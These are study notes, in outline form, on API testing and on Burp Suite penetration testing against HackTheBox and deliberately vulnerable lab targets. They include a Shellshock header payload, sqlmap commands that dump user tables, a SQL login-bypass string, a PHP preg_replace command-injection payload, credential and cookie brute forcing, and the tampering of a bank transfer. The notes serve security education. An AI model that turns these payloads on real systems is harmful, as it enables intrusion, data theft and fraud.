	• Mocks, stubs, and fakes (test doubles) are tools that let testers replace real system components with simulated ones during API testing. They make it easier to isolate and test specific parts of an API when the real dependencies are unavailable, unreliable, or would interfere with others.

	• Key Concepts

		○ Test Doubles

			§ Just like a stunt double in movies, test doubles stand in for real parts of the system during testing.

			§ These include mocks, stubs, and fakes, which all replace or simulate real implementations.

		○ Mocks

			§ Replace real implementations with fake ones.

			§ Useful when you need data from another system (e.g., third-party API) that you can’t or don’t want to call in a test environment.

			§ Example: Create a mock server in Postman to return a predefined response (like an empty list for a to-do app).

		○ Benefits of Using Mocks, Stubs, and Fakes

			§ Isolation: Test one part of a system without depending on external services.

			§ Controlled scenarios: Simulate specific situations that might be hard to reproduce (e.g., empty dataset, error response).

			§ Safe testing: Avoid disrupting shared test environments or external services.

		○ Cautions \& Limitations

			§ Using a fake implementation means you’re not testing the real system, so bugs may be missed.

			§ Test doubles should be balanced with real-world tests to ensure accuracy.

			§ They are powerful tools, but must be used thoughtfully and not as a replacement for real integration testing.



API Automation

	• API testing benefits hugely from automation, but automation and exploratory testing serve different goals. Use exploration to discover what matters; use automation to repeatedly check what must remain true.

	• Key Concepts

		○ Exploration vs. Automation

			§ Exploration: discovery, learning, finding new risks/behaviors.

			§ Automation: repetition to catch regressions; validates known, important behaviors.

		○ What to automate

			§ Stable contracts/things that shouldn’t change (endpoints, schemas, status codes).

			§ Signals you care about if they change (auth flows, critical workflows, response shapes).

			§ Aim for tests whose failures are actionable, not churn from expected evolution.

		○ Two common automation approaches

			§ Data-driven

				□ Sweep endpoints/parameters, validate responses broadly.

				□ Pros: wide coverage.

				□ Cons: can be slow, brittle, and high-maintenance if schemas/inputs evolve.

			§ Workflow-driven

				□ Chain calls to mimic real user/business flows.

				□ Pros: realistic, catches integration issues.

				□ Cons: need to pass state between steps; more orchestration logic.

		○ Design \& maintainability principles

			§ Treat suites like code: DRY helpers, shared fixtures, good naming, encapsulated data/setup.

			§ Prefer low-flakiness tests; isolate side effects; control test data.

			§ Be deliberate: not everything explored should be automated; optimize for long-term value.



Performance Testing

	• Performance testing helps evaluate how well an API (and the system it supports) behaves under different conditions, such as speed, load, and stress. APIs are powerful tools for performance testing because they allow programmatic, repeatable, and scalable test setups.

	• Key Concepts

		○ Performance Testing as a Broad Category

			§ Includes multiple forms of testing:

				□ Speed testing → How fast does a response come back?

				□ Load testing → How many requests per second/minute can the system handle?

				□ Stress testing → How does the system behave under extreme load or large datasets?

				□ Other related scenarios (scalability, concurrency, endurance).

		○ Using APIs for Load/Stress Testing

			§ APIs let you quickly generate large datasets without manual input.

			§ Example: Stress-testing a ToDo app by creating hundreds/thousands of tasks programmatically.

			§ Benefits:

				□ Saves time (no manual repetition).

				□ Creates controlled load conditions for testing.

			§ Can be done with scripts (Python + requests library) or tools like Postman.

		○ Using APIs for Speed Testing

			§ Measure response times by sending requests repeatedly.

			§ Collect statistics such as average runtime or distribution of response times.

			§ Can be done in:

				□ Postman (shows request time).

				□ Custom scripts (e.g., Python).

				□ Specialized tools (e.g., Apache JMeter) for deeper analysis.

		○ General Guidance

			§ APIs provide a realistic but programmatic entry point to test performance.

			§ Performance testing should go beyond just functional correctness → focus on scalability, efficiency, and robustness under load.

			§ The examples shown (scripts, Postman) are starting points; dedicated tools like JMeter are better for larger, more complex testing.



Security Testing

	• Security testing is critical for APIs. Authentication and authorization are important, but they are only part of the picture. APIs are a common attack surface, so testing must consider vulnerabilities like injection, input validation, and responsibility overlap between layers.

	• Key Concepts

		○ Don’t Reinvent Authentication/Authorization

			§ Use standard, proven auth protocols (OAuth, OpenID Connect, etc.).

			§ Rolling your own solution is error-prone unless you have the scale/resources of companies like Google.

		○ APIs as Attack Surfaces

			§ Attackers often target APIs because they are:

				□ Programmatic (easy to automate attacks).

				□ Central gateways to system data and logic.

			§ Common vulnerabilities:

				□ SQL Injection (SQLi)

				□ Cross-Site Scripting (XSS)

				□ Others like command injection, insecure direct object references.

		○ Shared Responsibilities

			§ Some vulnerabilities (e.g., XSS) can be mitigated at UI or API level.

			§ When responsibility overlaps, risk of gaps increases—must verify someone handles it.

		○ Input Validation

			§ APIs must enforce strict validation of inputs.

			§ Fuzzing (sending random/invalid inputs) is a common attacker technique.

			§ Example: If an API expects an integer, it should reject non-integers consistently.

		○ Security Testing Mindset

			§ Security testing is a specialized field, but testers should still:

				□ Be aware of common vulnerabilities.

				□ Try simple attacks (e.g., fuzzing, injection attempts).

				□ Verify enforcement of validation and authorization.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Burp Suite

#### Burp Suite Basics





What is Burp Suite?

	• Burp Suite is the industry-standard tool for professional web penetration testing, providing a complete and extensible framework to test modern web applications, portals, and APIs for vulnerabilities.

	• Key Concepts

		○ Context of Use

			§ Most modern applications are accessed through web portals (cloud services, on-prem apps, REST APIs).

			§ This makes web-based penetration testing a major focus for security testers.

		○ Need for Specialized Tools

			§ Web protocols (HTTP, HTTPS, REST) require tools that can:

				□ Understand and manipulate traffic.

				□ Detect vulnerabilities.

				□ Automate scanning.

		○ Comparison with Other Tools

			§ Simple scanners like Whatweb.

			§ Open-source tools like OWASP ZAP.

			§ But the preferred tool for professionals is Burp Suite.

		○ Capabilities of Burp Suite

			§ Web scanning: Find vulnerabilities in applications.

			§ Spidering: Crawl and discover all pages of a website.

			§ Proxying: Intercept and manipulate traffic between client and server.

			§ Message creation \& replay: Craft and send test inputs to web apps.

		○ Editions of Burp Suite

			§ Community Edition (Free): Limited features, but still powerful for beginners.

			§ Professional Edition: Full capabilities for pen testers.

			§ Enterprise Edition: Includes everything in Professional + integration into DevOps workflows for large organizations.





Getting to Know Burp Suite

	• This section introduces Burp Suite’s Community Edition interface and features, walking through its dashboard, target and proxy functions, and basic setup. It highlights the differences between the Community and Professional editions and explains how Burp Suite captures, filters, and manipulates traffic for penetration testing.

	• Key Concepts

		○ Starting Burp Suite

			§ Community Edition in Kali Linux: Found under Web Application Analysis.

			§ Temporary vs Persistent Projects:

				□ Community Edition only supports temporary projects.

				□ Professional Edition allows storing projects on disk (needed for full client work).

			§ Default startup: Temporary project + default settings.

		○ Interface Overview

			§ Menu items: Burp, Intruder, Repeater, Window, Help.

			§ Activity Ribbon: Quick access to Burp tasks and actions.

			§ Context Menus: Multiple ways to perform tasks; users develop their own workflow style.

		○ Dashboard

			§ Panels: Tasks, Event Logs, Issue Activity, Advisory Panel.

			§ Community Edition limitations: Only passive crawling is supported; no active scanning.

			§ Tasks and status buttons: Configure live tasks, scope, and scan settings.

		○ Target Functions

			§ Site Map: Displays target web-tree, requests/responses, and message exchanges.

			§ Inspector Panel: Extracts key details from messages for quicker review.

			§ Scope Settings: Define which URLs/traffic are in-scope, reducing noise.

			§ Issue Definitions: Built-in vulnerability references.

		○ Proxy Functions

			§ Components: Intercept, HTTP History, WebSockets History, Options.

			§ Intercept: Hold, modify, forward, or drop requests/responses.

			§ HTTP History: Logs all HTTP traffic (in/out of scope).

			§ WebSockets History: Logs real-time JSON packet exchanges in modern apps.

			§ Options:

				□ Set listening ports (default 8080).

				□ Configure which messages to intercept (requests, responses, WebSockets).

				□ Option to unhide hidden fields in responses.

				□ Match/replace rules for automated modifications.

		○ Advanced Features

			§ Multi-proxying: Burp can handle multiple listening proxies for complex setups.

			§ Collaboration Server (Professional Edition):

				□ Used for advanced testing like blind SQL injection.

				□ By default uses PortSwigger’s public server, but private servers can be configured.



Proxying Web Traffic

	• Burp Suite acts as a proxy tool that allows penetration testers to intercept, inspect, and manipulate web traffic between a browser (or mobile device) and a web application. Setting up a browser or device to route traffic through Burp Suite enables deeper analysis of requests and responses.

	• Key Concepts

		○ What Proxying Means

			§ Normally: Browser → Website directly.

			§ With Burp Suite: Browser → Burp Suite Proxy → Website.

			§ This enables testers to:

				□ Inspect requests and responses.

				□ Modify messages before they reach the server.

				□ Inject new traffic for testing.

		○ Using Burp Suite’s Built-in Brows

			§ Burp Suite includes its own browser pre-configured to work with its proxy.

			§ This avoids the need for manual setup.

		○ Configuring External Browsers (Example: Firefox in Kali)

			§ Steps to configure Firefox:

				□ Open Preferences → Network Settings.

				□ Change from No Proxy to Manual Proxy.

				□ Set proxy server to 127.0.0.1 (localhost).

				□ Set port to 8080.

				□ Apply same settings for HTTP, HTTPS, and FTP traffic.

		○ Proxying Mobile Traffic (Example: Android)

			§ Steps to configure Android network:

				□ Long press on the network name → Modify network.

				□ Check Show advanced options.

				□ Select Proxy → Manual.

				□ Set proxy address to the Burp Suite host machine’s IP.

				□ Set port to 8080.

			§ This allows intercepting mobile app/web traffic through Burp Suite.



Using Burp Suite as a Proxy

	• Burp Suite’s proxy function enables testers to intercept, analyze, and manage web traffic. The Community Edition allows passive traffic capture and scoping, while the Professional Edition adds automation like spidering/crawling and vulnerability scanning.

	• Key Concepts

		○ Using Burp’s Proxy and Browser

			§ Start with Proxy → Intercept (turn off intercept to let traffic flow).

			§ Burp launches its own Chromium-based browser.

			§ Navigating to a target (e.g., Metasploitable) sends all traffic through Burp, which records it in the Target → Site Map.

		○ Community Edition Capabilities

			§ Records only what you visit manually (no automated crawling/spidering).

			§ Message Exchanges Panel: Shows requests/responses for each page visited.

			§ Target Scope Control:

				□ Define what’s in-scope via Scope Settings or right-clicking specific targets.

				□ Out-of-scope traffic can be excluded to reduce clutter.

			§ Discovery Example: Found a hidden database password in an HTML comment — showing how even simple inspection can reveal vulnerabilities.

		○ Scope Management

			§ Add/remove specific URLs or directories to scope.

			§ Burp can filter out-of-scope traffic and focus on target systems.

			§ Example: Added Mutillidae and DVWA to scope to ensure their traffic is captured.

		○ Community vs. Professional Edition

			§ Community Edition:

				□ Passive recording only.

				□ No automated spidering or active vulnerability scanning.

			§ Professional Edition:

				□ Adds Passive Scanning: Crawls site to discover pages.

				□ Adds Active Scanning: Actively tests discovered pages for vulnerabilities.

				□ Results appear in the Issues Pane as vulnerabilities are detected.



Setting Up Additional Targets

	• To practice penetration testing with Burp Suite, it’s helpful to have multiple vulnerable web applications set up as targets. The transcript demonstrates setting up OWASP’s Broken Web Application (BWA) and Xtreme Vulnerable Web Application (XVWA) for training and hands-on practice.

	• Key Concepts

		○ OWASP Broken Web Application (BWA) VM

			• Downloadable virtual machine appliance.

			• Contains multiple deliberately vulnerable apps for training, including:

				□ WebGoat (Java-based security lessons).

				□ RailsGoat (Ruby on Rails vulnerabilities).

				□ Damn Vulnerable Web Application (DVWA).

				□ Security Shepherd (gamified web security trainer).

				□ Mutillidae II (updated version of Mutillidae).

				□ Real-world examples like OrangeHRM (older HR management app).

			• Provides a consolidated environment for security training.

		○ Xtreme Vulnerable Web Application (XVWA)

			• A PHP/SQL-based vulnerable app designed for practice.

			• Can be hosted on a Kali Linux system.

			• Setup steps:

				□ Start Apache and MySQL services:

					sudo service apache2 start  

					sudo service mysql start

				□ Clone repository into web root:

					cd /var/www/html  

					sudo git clone https://github.com/s4n7h0/xvwa.git

				□ Create and configure database:

					sudo mysql -u root -e "create database xvwa;"  

					sudo mysql -u root -e "grant all privileges on \*.\* to xman@localhost identified by 'xman';"

				□ Update config.php with the new username/password (xman/xman).

				□ Complete setup by visiting the XVWA site in a browser.

		○ Why Multiple Targets Help

			• Different apps expose testers to different languages, frameworks, and vulnerabilities.

			• Expands hands-on skills with Burp Suite.

			• Encourages real-world practice beyond a single testbed (e.g., Metasploitable).



#### Scanning



Crawling the Website

	• Burp Suite Professional Edition enables automated crawling and auditing of a website. The crawler systematically explores the site, while the auditor tests for vulnerabilities, highlighting issues with severity levels. Authentication can also be configured to extend testing into protected areas.

	• Key Concepts

		○ Crawling in Burp Suite Professional

			• Crawling = Automated exploration of a website’s structure and links.

			• Initiated by right-clicking a target in the Site Map and opening the scan panel.

			• Parameters include the target URL, HTTP/HTTPS options, etc.

			• Crawl results populate the website tree in the Site Map.

		○ Auditing (Vulnerability Testing)

			• After crawling, Burp Suite automatically starts auditing discovered pages.

			• Issues appear in the Issues Pane (top-right), categorized by severity.

			• Red dots in the Site Map indicate high-severity vulnerabilities.

			• Each issue includes:

				□ Advisory details.

				□ Request and response messages that triggered detection.

		○ Example Findings

			• File Path Manipulation in Mutillidae.

			• OS Command Injection vulnerabilities.

			• Each vulnerability can be inspected alongside the associated web page and traffic.

		○ Authenticated Scans

			• Burp Suite supports scanning behind login forms.

			• Testers can configure application credentials:

				□ Example: DVWA → username: admin, password: password.

			• Burp will automatically use these credentials to log in during crawling, enabling deeper testing of protected content.



Finding Hidden Webpages

	• Web servers often have hidden or unlinked pages (e.g., admin consoles, configuration files, secondary apps). Burp Suite provides built-in tools to perform content discovery, similar to external tools like DirBuster or Gobuster, to uncover these hidden endpoints.

	• Key Concepts

		○ Why Hidden Pages Matter

			§ Many web applications expose unlinked resources:

				□ Admin portals (/admin).

				□ Configuration files (e.g., phpinfo.php, phpmyadmin).

				□ Application subdirectories.

			§ These may contain sensitive functionality or credentials.

			§ They are not discoverable through normal navigation since they aren’t linked.

		○ Discovery Tools

			§ External tools: dirb, Gobuster, DirBuster.

			§ Burp Suite’s built-in content discovery offers similar functionality.

		○ Burp Suite Discovery Workflow

			§ Set Scope: Add target (e.g., 10.10.10.191) to ensure focused results.

			§ Crawl: Initial automated crawl finds linked pages.

			§ Engagement Tools → Discover Content:

				□ Configure parameters:

					® Set crawl depth (e.g., depth 2).

					® Choose wordlists (e.g., DirBuster medium).

					® Exclude unnecessary file extensions.

				□ Run discovery session.



Understanding Message Content

	• To effectively use Burp Suite for penetration testing, testers must understand how messages (requests and responses) are displayed, analyzed, and manipulated. Burp Suite provides multiple views, search tools, and inspectors to uncover details that may not be visible in the browser, such as hidden fields or injected parameters.

	• Key Concepts

		○ Message Panels in Burp Suite

			§ Contents Panel:

				□ Shows overall message exchanges with timestamp, status, length, content type, and webpage title.

			§ Request \& Response Panels:

				□ Can be viewed raw, in “pretty” formatted mode, or “rendered” as processed HTML.

				□ Configurable layout: side-by-side, vertical, or tabbed.

			§ Inspector: Extracts key details like request attributes, request/response headers.

		○ Search and Analysis Features

			§ Search boxes allow keyword matching in request/response panels.

			§ Supports case-sensitive and regex searches.

			§ Context menus and dropdowns provide shortcuts for analyzing and acting on data.

		○ Understanding HTTP Data Encoding

			§ Input fields in forms are sent as key=value pairs concatenated with “\&”.

			§ Example: payee=SPRINT\&amount=75.

			§ Shows how what’s visible in the browser may differ from what’s actually sent in the request.

		○ Detecting Hidden or Unexpected Data

			§ Example: Anonymous feedback form added a user ID (3487) automatically, even though the user didn’t provide it.

			§ Burp’s Response Modification Option (“unhide hidden form fields”) reveals hidden fields in web forms.

			§ Hidden fields may be used for tracking, fingerprinting, or security tokens.

		○ Headers and Security Testing

			§ Important details may appear in message headers:

				□ Session IDs.

				□ Authorization tokens.

				□ Other credentials.

			§ Headers are potential targets for specific attacks, e.g.:

				□ Web cache poisoning.

				□ Virtual host brute forcing.



Finding Missing Content

	• When analyzing web traffic in Burp Suite, important messages (like failed logins or authorization headers) may not always appear in the main panels. Testers must know how to adjust view settings, use interception, and check HTTP history to ensure no crucial content is missed during penetration testing.

	• Key Concept

		○ Login Testing Scenario (HackTheBox “Jerry”)

			§ Target: Tomcat server on port 8080.

			§ Attempted login (tomcat:tomcat) produces a 401 Unauthorized response.

			§ Credentials are sent but not immediately visible in the main Site Map view.

		○ Why Content Can Be Missing

			§ Burp Suite may filter out certain responses (e.g., 4xx errors).

			§ By default, these aren’t shown in the messages panel.

			§ Users must adjust the view filter settings (e.g., click “Show all”).

		○ Capturing Authorization Headers

			§ With Proxy → Intercept on, login requests show full HTTP messages.

			§ Example: Request to /manager/html includes an Authorization header (Base64-encoded credentials).

			§ Decoding reveals credentials (e.g., tomcat:tomcat, bobcat:bobcat, kitty:kitty).

		○ Differences Between Browsers

			§ Using Burp’s embedded browser vs. external browsers (like Kali Firefox) can affect what appears in the Site Map.

			§ Some messages are overwritten in the Content panel (only the last attempt may be displayed).

		○ Using HTTP History

			§ To recover all prior requests/responses, use Proxy → HTTP History.

			§ Provides the full sequence of messages, including:

				□ Attempts without authorization headers.

				□ Attempts with Base64-encoded credentials.

			§ Ensures no traffic is lost even if panels overwrite earlier data.

		○ Fundamental Lesson

			§ Don’t rely solely on one panel in Burp Suite.

			§ If traffic looks incomplete or missing:

				□ Check filter settings.

				□ Use intercept mode.

				□ Inspect HTTP history for the full picture.

#### Man in the Middle



Interpreting Bank Transactions

	• Burp Suite can be used to intercept and manipulate live web transactions, demonstrating how attackers could modify sensitive actions (like bank transfers) during transmission. This highlights the risk of man-in-the-middle (MITM) attacks when data isn’t protected by strong security controls (e.g., HTTPS).

	• Key Concepts

		○ Burp Suite Interception in Action

			§ User logs into a demo online banking site with credentials (username/password).

			§ Performs a fund transfer of $10 from savings to brokerage.

			§ With Intercept ON in Burp Suite:

				□ The request is captured showing transaction details (amount, source, destination, comment).

				□ Tester changes the transfer amount from $10 to $99.

				□ Burp forwards the modified request.

				□ Result: The bank confirms a $99 transfer, proving successful message tampering.

		○ Vulnerability Demonstrated

			§ Unencrypted or weakly protected traffic can be intercepted and modified.

			§ Attacker could alter:

				□ Transaction amount.

				□ Destination account.

				□ Other form parameters (e.g., comments, metadata).

		○ Security Risk Highlighted

			§ Using online banking over public Wi-Fi without proper protections exposes users to MITM attacks.

			§ Attackers could impersonate the server, intercept traffic, and modify financial transactions.

		○ Underlying Lesson

			§ Burp Suite interception illustrates the importance of:

				□ Transport security (TLS/HTTPS) to prevent message tampering.

				□ Server-side validation to ensure integrity of transactions.

				□ Defense in depth (e.g., cryptographic checks, multifactor confirmation).



Exploiting Headers

	• Burp Suite can be used to exploit vulnerabilities in HTTP headers, such as the Shellshock vulnerability in Bash CGI scripts, to achieve remote code execution on a target system.

	• Key Concepts

		○ Initial Reconnaissance

			§ Target: HackTheBox system Shocker (10.10.10.56).

			§ Initial site crawl and scan revealed little content.

			§ Used Burp’s Engagement Tools → Discover Content:

				□ Found /cgi-bin/ directory.

				□ Discovered user.sh script inside.

		○ Testing the CGI Script

			§ Visiting /cgi-bin/user.sh returned a basic uptime response.

			§ Indicated the script is executable server-side (a common CGI trait).

		○ Exploiting with Shellshock

			§ Vulnerability: Bash’s Shellshock bug (CVE-2014-6271).

			§ Attack method: Inject payload via custom HTTP headers.

			§ Process in Burp:

				□ Right-click request → Send to Repeater.

				□ Modify the User-Agent header with a Shellshock payload:

					® () { :; }; echo; /bin/bash -c "whoami"

				□ Response: Returned shelly → command execution confirmed.

		○ Escalating the Exploit

			§ Replacing whoami with other commands:

				□ cat /etc/passwd → dumped password file.

				□ ls /home/shelly → listed Shelly’s home directory.

				□ cat user.txt → retrieved user flag (proof of compromise).

		○ Core Lesson

			§ Message headers are not just metadata; they can be attack vectors.

			§ Burp Suite’s Repeater tool makes it easy to manipulate headers and test payloads.

			§ The Shellshock case demonstrates how a single vulnerable script can lead to full system compromise.



Inserting an SQL Injection via Burp Suite

	Burp Suite can work alongside SQLmap to identify and exploit SQL injection vulnerabilities in web applications. Using captured requests from Burp, testers can craft injections (like union queries) to bypass authentication and gain unauthorized access to backend databases and admin portals.

	• Key Concepts

		○ Target Setup

			§ Target: Europa Corp Admin Portal (admin-portal.europacorp.htb).

			§ Configured in /etc/hosts and set within Burp’s target scope.

			§ Login form requires email + password.

		○ Capturing Login Requests

			§ Used Burp Suite to capture a POST request with test credentials (test@test.nz / password).

			§ The captured request contains the parameters needed for injection testing.

		○ Using SQLmap with Burp Data

			§ Extracted the POST data from Burp’s captured message.

			§ Ran SQLmap with:

				sqlmap -u https://admin-portal.europacorp.htb/login.php --data="email=test@test.nz\&password=password" --dbms=mysql

			§ SQLmap confirmed three SQL injection vectors.

			§ Enumeration revealed:

				□ Databases: information\_schema, admin.

				□ Inside admin: a user's table containing usernames and password hashes.

		○ Manual Exploitation with Burp Repeater

			§ Knowledge from SQLmap showed the login query had five columns.

			§ Used Burp’s Repeater to inject a UNION-based SQL injection:

				email=test@test.nz' OR 1=1 LIMIT 1 --  

			§ Modified request successfully bypassed authentication.

			§ Redirection confirmed access to the admin portal.

		○ Key Lessons

			§ Burp Suite helps capture and manipulate raw HTTP requests.

			§ SQLmap automates vulnerability detection and database enumeration.

			§ Together, they provide a workflow for finding and exploiting SQL injection:

				□ Capture request in Burp.

				□ Feed into SQLmap for automated testing.

				□ Return to Burp to craft custom injections.

				□ Achieve authentication bypass or extract sensitive data.

				



Saving Request Messages for Further Exploitation

	• Burp Suite allows testers to save complete HTTP request messages for later use. These saved requests can be fed directly into SQLmap for automated SQL injection testing and database exploitation, providing an efficient workflow for vulnerability analysis.

	• Key Concepts

		○ Target System

			§ Hack The Box server Falafel (10.10.10.73).

			§ Website presents a login page.

			§ Observed behavior:

				□ Valid username, wrong password → “wrong identification” response.

				□ Invalid username → “try again” response.

			§ This distinction suggests a potential SQL injection vulnerability.

		○ Saving Request Messages in Burp Suite

			§ Captured the POST login request from Burp’s Site Map.

			§ Used Actions → Copy to File to save it as falafel.txt.

			§ This file contains the raw HTTP request, which SQLmap can process directly.

		○ Using SQLmap with Saved Requests

			§ SQLmap command:

				sqlmap -r falafel.txt --string "wrong identification"

				□ -r falafel.text = run SQLmap using the saved HTTP request.

				□ --string "wrong identification" = tells SQLmap what valid response to expect.

			§ SQLmap identified the injection vulnerability.

		○ Database Enumeration and Exploitation

			§ With injection confirmed, further SQLmap commands were run:

				□ --dbs → listed databases: falafel, information\_schema.

				□ -D falafel --tables → listed tables in the Falafel DB.

				□ -D falafel -T users --dump → dumped the users table.

			§ Results: Extracted usernames (admin, Chris) and password hashes.

			§ Next logical step (not shown): password cracking.

		○ Key Lessons

			§ Saving Burp request messages is a powerful way to bridge manual and automated testing.

			§ SQLmap can use full HTTP requests instead of just parameters, enabling:

				□ More reliable testing.

				□ Easier handling of complex requests.

			§ Recognizing different server responses helps identify injection points.



Injecting Commands into Messages

	• Burp Suite can be used to intercept and modify HTTP messages in order to exploit application vulnerabilities. In this case, a flaw in PHP’s preg\_replace function (with the /e modifier) allows remote command execution by injecting system commands into intercepted requests.

	• Key Concepts

		○ Target and Setup

			§ Target: Europa admin console → Tools page.

			§ Functionality: Generates a VPN script using a user-supplied IP address.

			§ The IP input is processed by a PHP preg\_replace function, which is vulnerable when used with the /e modifier.

		○ Understanding the Vulnerability

			§ The /e flag in preg\_replace interprets replacement strings as PHP code, enabling arbitrary command execution.

			§ By manipulating the request, attackers can substitute the IP field with PHP system commands.

		○ Exploitation Steps with Burp Suite

			§ Enter a placeholder IP (e.g., 10.10.10.99) and generate the script.

			§ Enable Burp Proxy → Intercept ON to capture the POST request to tools.php.

			§ Modify the payload:

				pattern=something%2Fe

				ip\_address=system('ls -al /')

				text=something

				□ %2F used for forward slashes (URL encoding).

				□ Command embedded into the IP field.

			§ Adjust Content-Length to match the new payload.

			§ Forward the request.

		○ Results of Injection

			§ First payload (ls -al /) → root directory listing returned.

			§ Second payload (ls -al /home) → revealed user directory (john).

			§ Third payload (cat /home/john/user.txt) → successfully dumped the user token.

		○ Key Lessons

			§ Message interception and modification is a powerful penetration testing technique.

			§ Vulnerabilities in backend functions (e.g., preg\_replace /e) can be leveraged for remote command execution.

			§ Burp Suite provides the control needed to adjust payloads (intercept, edit, recalc content length) for successful exploitation.



#### Being an Intruder



Introducing the Intruder

	• Burp Suite’s Intruder tool automates customized attacks on web applications, such as brute-force login attempts. It allows testers to select input fields as payload positions, supply wordlists, apply transformations, and analyze responses to discover valid credentials or exploit vulnerabilities.

	• Key Concepts

		○ Setting Up the Intruder Attack

			§ Target: DAB server (HackTheBox) at 10.10.10.86 on port 80.

			§ Initial attempt: Manual login with admin/admin failed.

			§ Process:

				□ Capture login POST request.

				□ Send to Intruder via Burp actions.

				□ Select Positions tab → mark input fields (e.g., password) with section markers.

		○ Configuring Payloads

			§ Payloads Tab:

				□ Load wordlists (e.g., /usr/share/wordlists/metasploit/unix\_passwords.txt).

				□ Options for payload processing: add prefixes, suffixes, modify case, etc.

			§ Encoding Options: Can transform payloads if required (e.g., Base64).

		○ Running the Attack

			§ Options Tab: Controls attack behavior (redirect handling, result processing, etc.).

			§ Attack Results:

				□ Initial run → all responses were 709 bytes (indicating failed logins).

				□ Second run with payload processing (modify case → capitalize first letter).

				□ Entry 28 (Password1) produced a different response size (512 bytes).

			§ Analyzing Results

				□ A response with different length/status often signals success.

				□ Verification showed admin:Password1 successfully logged in.

				□ Intruder flagged this by showing the different response content and size.

			§ Lessons Learned

				□ Intruder is powerful for brute-force and fuzzing attacks.

				□ Wordlists + payload processing increase effectiveness (e.g., case variations).

				□ Response analysis (length, redirects, status codes) is critical to spotting successful payloads.

				□ Attack options like redirection handling affect results visibility.



Manipulating Cookies

	• Burp Suite’s Intruder can be used to manipulate and brute-force cookie values in HTTP requests. By modifying cookies in intercepted messages and automating payload injection, testers can uncover hidden authentication mechanisms and gain access to restricted areas.

	• Key Concepts

		○ Enabling Cookies in Burp’s Browser

			§ Cookies are disabled by default in Burp’s browser.

			§ Must enable them via: Settings → Privacy \& Security → Cookies → Allow all cookies.

		○ Target Setup

			§ Logged into the DAP server (10.10.10.86) with admin:Password1.

			§ Main site showed nothing interesting, but another service on port 8080 displayed:

				□ “Access denied: password authentication cookie not set.”

			§ Observed request contained a session ID cookie, but no password field.

		○ Injecting a Cookie Value

			§ Hypothesis: A password field must exist in the cookie.

			§ Used Proxy → Intercept ON to capture request.

			§ Added:

				Cookie: sessionid=xyz; password=password1

			§ Server responded: “password authentication cookie incorrect” → confirmed cookie injection works but wrong password.

		○ Brute Forcing with Intruder

			§ Sent the modified request to Intruder.

			§ Cleared existing section markers, set the password cookie value as the payload position.

			§ Loaded wordlist (unix\_passwords.txt) as payload source.

			§ Ran attack:

				□ Most responses = 491 bytes (failed logins).

				□ Entry 41 (password=secret) = 707 bytes (different response).

				□ Rendering response confirmed successful access to a TCP ticket test page.

		○ Lessons Learned

			§ Cookies can contain hidden authentication fields, not just session IDs.

			§ Burp Intruder is effective for automating brute force attacks on cookie values.

			§ Response size and content differences are critical in detecting successful payloads.

			§ Insecure design (storing passwords in cookies) creates significant risk.



The Four Intruders

	• Burp Suite’s Intruder module supports four different attack types—Sniper, Battering Ram, Pitchfork, and Cluster Bomb—each suited to different testing scenarios. Combined with multiple payload types (lists, runtime files, brute force generators), Intruder provides a highly flexible and powerful tool for automated attacks against web applications.

	• Key Concepts

		○ Intruder Attack Types

			§ Sniper (default)

				□ Uses a single payload set.

				□ Best for testing one field at a time.

				□ If applied to multiple fields, it cycles through each field while keeping others fixed.

				□ # of requests = (payload entries × # of fields tested).

			§ Battering Ram

				□ Also uses a single payload set.

				□ Applies the same payload value to multiple fields at once.

				□ Useful when same input required across fields (e.g., username = password).

				□ # of requests = payload entries.

			§ Pitchfork

				□ Uses multiple payload sets (one per field).

				□ Uses the nth entry from each list simultaneously across fields.

				□ Example: 5th request = 5th value from each payload set.

				□ # of requests = size of the smallest payload list.

			§ Cluster Bomb

				□ Uses multiple payload sets.

				□ Tries every combination across all fields.

				□ Very powerful but grows exponentially.

				□ # of requests = product of payload set sizes.

		○ Payload Types

			§ Simple List: Manually or from a file.

			§ Runtime File: Dynamically loaded during attack.

			§ Brute Forcer: Generates values on the fly.

				□ Tester specifies character set and min/max length.

				□ Example: Between 4–6 chars → >1.5 million combinations.

				□ Extremely time-consuming for longer lengths.

		○ Practical Notes

			§ Intruder results depend heavily on:

				□ Correctly identifying input fields.

				□ Smart payload list selection.

				□ Attack type matching the test case.

			§ Example use cases:

				□ Sniper: SQL injection fuzzing on one parameter.

				□ Battering Ram: Username = Password brute force.

				□ Pitchfork: Coordinated parameter testing.

				□ Cluster Bomb: Exhaustive parameter combination testing.



#### Extensions



Using C02 to integrate SQLMap

	Burp Suite can be extended with BApp Store extensions. The CO2 extension integrates SQLmap directly into Burp Suite, allowing testers to quickly launch SQL injection testing from captured requests without manually copying data into the terminal.

	• Key Concepts

		○ Installing Extensions in Burp Suite

			§ Navigate to Extender → BApp Store.

			§ Many extensions are available to extend Burp’s functionality.

			§ CO2 is a commonly used extension for SQLmap integration.

		○ Setting Up CO2

			§ After installation, CO2 appears as a new tab in the menu bar.

			§ Configuration requires the path to SQLmap, e.g.:

				/usr/share/sqlmap/sqlmap.py

			§ On Linux, xterm must also be installed to run SQLmap through Burp:

				sudo apt install xterm

		○ Using CO2 with Burp Suite

			§ Example target: HackTheBox Falafel (10.10.10.73).

			§ Capture a POST login request.

			§ Right-click the request → Extensions → CO2 → Send to SQLmapper.

			§ CO2 automatically sets up a SQLmap command string for the selected request.

		○ Running the SQLmap Attack

			§ SQLmap can run directly from Burp (launches in xterm).

			§ Alternatively, testers can copy the generated SQLmap string and run it manually in a terminal.

			§ Result: SQL injection vulnerabilities are detected, same as when running SQLmap independently.

		○ Key Benefits

			§ Saves time by integrating SQLmap workflow inside Burp Suite.

			§ Provides a seamless bridge between manual request capture and automated SQL injection testing.

			§ Flexible: Run SQLmap inside Burp or extract the command for external use.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#### Dynamic Application Security Testing

#### Security Testing in QA



Software Quality Assurance Process

	• The central theme is that security should be treated as a function of quality within the Software Development Life Cycle (SDLC). By embedding security testing into quality assurance (QA) practices, security flaws can be addressed as code defects (bugs), ensuring applications are both functional and secure.

	• Key Concepts

		○ SDLC (Software Development Life Cycle)

			§ A structured process for taking software from an idea to a deployed solution.

			§ Phases include requirements gathering, design, coding, testing, deployment, and maintenance.

			§ It is cyclical: new requirements or changes feed back into earlier phases.

		○ Integrating Security into QA

			§ Security should not be an afterthought or add-on.

			§ Instead, it should be embedded into QA processes as a measure of software quality.

			§ Security defects should be treated like any other bug in the backlog.

		○ Software Quality Assurance (QA)

			§ QA ensures applications meet defined quality standards before release. Activities include:

				□ Technical reviews to identify flaws.

